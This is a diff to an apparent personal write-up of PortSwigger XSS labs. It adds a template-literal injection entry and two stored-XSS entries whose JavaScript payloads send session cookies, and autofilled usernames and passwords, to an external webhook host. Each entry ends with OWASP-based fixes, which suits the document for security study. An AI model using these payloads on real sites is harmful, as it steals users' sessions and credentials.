@@ -211,7 +211,7 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   6. Because I bypass the WAF filter with non-filterd tag and attribution, the function `prompt()` will be executed once someone clicks on the link.
 
   _**Suggestion**_
-  1. [Treating user input strictly as data](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-defense-philosophy). Encode/escape for the HTML context or render search terms as text nodes, never raw HTML
+  1. [Treating user input strictly as data](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-defense-philosophy). Encode/escape for the HTML context or render search terms as text nodes, never raw HTML.
   2. Apply a server‑side allowlist sanitizer (or a vetted library such as [DOMPurify](https://www.npmjs.com/package/dompurify) when sanitization is required)
   3. Enforce [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) that disallows inline event handlers/scripts.
   4. [Harden WAF normalization/rules](https://docs.oracle.com/en-us/iaas/Content/WAF/Protections/protections_management.htm) to catch decoded event-attribute payloads.
@@ -380,7 +380,7 @@ In this instance, I discovered that untrusted input from the URL query string is
        ';document.write('
      ```
    
-Suggestion
+  _**Suggestion**_
   1. Validate and sanitize user input on client side to reject or clean inputs containing malicious characters or script tags.
   2. When inserting user input into JS strings, use [output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) that safely escapes all special characters that could break the context, not just single quotes and backslashes.
   3. Don't place variables into [dangerous contexts](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts) as even with output encoding.
@@ -435,6 +435,36 @@ Suggestion
   </details>
   -
 
+  _**10. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**_  
+  This web application is vulnerable to a Reflected XSS flaw due to unsafe interpolation of user input within a [JavaScript template literal](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals). Although special characters (`<>`, `"`, `'`, `\`, `` ` ``) are Unicode-escaped, the vulnerability remains because input is evaluated inside a `${}` expression within the template literal without proper escaping.
+
+  <details markdown="1">
+  <summary>Click me to expand the process</summary>
+
+  1. I start by testing the input (`'"``<>\`) to see where it is rendered in the source code, then I find my input is in a JavaScript template literals. And I also notice that all the special characters are unicode-escaped.
+     ```javascript
+     <script>
+       var message = `0 search results for '\u0027\u0022\u0060\u003c\u003e\u005c'`;
+       document.getElementById('searchMessage').innerText = message;
+     <\script>
+     ```
+     
+  2. Because JavaScript evaluates whatever is inside the embedded expression (`${}`) of a template literal as code, I tried to insert my payload directly to test whether there was a filter or any other protection implemented.
+     A window popped up after inserting my payload, which proves this instance is still vulnerable to reflected XSS because there is no protection on its JS template literal.
+     ```javascript
+     <script>
+       var message = `0 search results for '${prompt()}'`;
+       document.getElementById('searchMessage').innerText = message;
+     <\script>
+     ```
+
+  _**Suggestion**_
+  1. Apply JS [context-aware encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) when injecting untrusted data into JavaScript,
+  2. Apply a server‑side allowlist sanitizer (or a vetted library such as [DOMPurify](https://www.npmjs.com/package/dompurify) when sanitization is required)
+  3. Implement [CSP header](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) to reduce the impact of XSS.
+
+  </details>
+  -
 
 </details>
 
@@ -746,6 +776,69 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
 
   </details>
   -
+
+  _**4. Store XSS in comment section to steal cookies**_  
+  The web application contains a Stored XSS vulnerability in its comment section, I retrieve other users' cookie session by storing the persist JavaScript that executes in the browsers of other users who view the infected post.
+  
+  <details markdown="1">
+  <summary>Click me to expand the process</summary>
+
+  1. To start with, I leave a prompt function in the comment section of a post on the web application for testing the XSS vulnerability. After I refresh the page, a window pop up to prove it is vulnerable to XSS.
+
+  2. To simulate a more realistic scenario, I leave JavaScript that causes other users' browsers to automatically post their session cookies to my controlled domain ([Webhook](https://webhook.site/)).
+     ```javascript
+     <script>
+     fetch('https[://]webhook[.]site', {
+       method: 'POST',
+       mode: 'no-cors',
+       body: document.cookie
+     });
+     </script>
+     ```
+
+  3. After retrieving the cookie, I can use it to impersonate the cookie owner for further exploitation.
+
+  _**Suggestion**_
+  1. Use a proven HTML sanitizer (e.g. [DOMPurify](https://www.npmjs.com/package/dompurify)) to safely handle rich-text or HTML input.
+  2. [Escape characters](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) appropriately for the output context (HTML, JavaScript, or attributes).
+  3. Set session cookies with the [HttpOnly](https://owasp.org/www-community/HttpOnly) and Secure flags to prevent access via JavaScript and enforce HTTPS usage
+  4. Apply a [CSP header](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) that blocks inline scripts and restrict script sources.
+  5. [validate inputs](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#implementing-input-validation) (e.g., quotes, backslashes, and parentheses) in all user input fields.
+
+  </details>
+  -
+
+  _**5. Exploiting cross-site scripting to capture passwords**_  
+  The web application is vulnerable to a stored XSS in the post comment section. This vulnerability allows an attacker to inject JavaScript function into user comments. When other users view the compromised comment, it executes in their browsers and automatically exfiltrating saved credentials from browser password managers by using a `fetch()` call to send the data to external domain.
+  
+  <details markdown="1">
+  <summary>Click me to expand the process</summary>
+
+  1. To start with, I leave a prompt function in the comment section of a post on the web application for testing the XSS vulnerability. After I refresh the page, a window pop up to prove it is vulnerable to XSS.
+
+  2. To simulate a more realistic scenario. In the comment field of the post, I create two HTML input fields that cause users' password managers to automatically fill the saved username and password and forward them to my controlled domain. ([Webhook](https://webhook.site/)).
+     ```javascript
+     <input name=username id=username>
+     <input type=password name=password onchange="if(this.value.length)fetch('https[://]webhook[.]site',{
+       method: 'POST',
+       mode: 'no-cors',
+       body:username.value+':'+this.value
+     });">
+     ```
+
+  3. After retrieving the users' credentials, I can use it to impersonate the cookie owner for further exploitation.
+
+  _**Suggestion**_
+  1. Use a proven HTML sanitizer (e.g. [DOMPurify](https://www.npmjs.com/package/dompurify)) to safely handle rich-text or HTML input.
+  2. [Escape characters](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) appropriately for the output context (HTML, JavaScript, or attributes).
+  3. Apply a [CSP header](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) that blocks inline scripts and restrict script sources.
+  4. [validate inputs](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#implementing-input-validation) (e.g., quotes, backslashes, and parentheses) in all user input fields.
+  5. On client-side, disable [autofill in sensitive contexts](https://cybernews.com/security/password-managers-autofill-credentials-for-attackers/).
+
+  </details>
+  -
+
+
 
 </details>
 
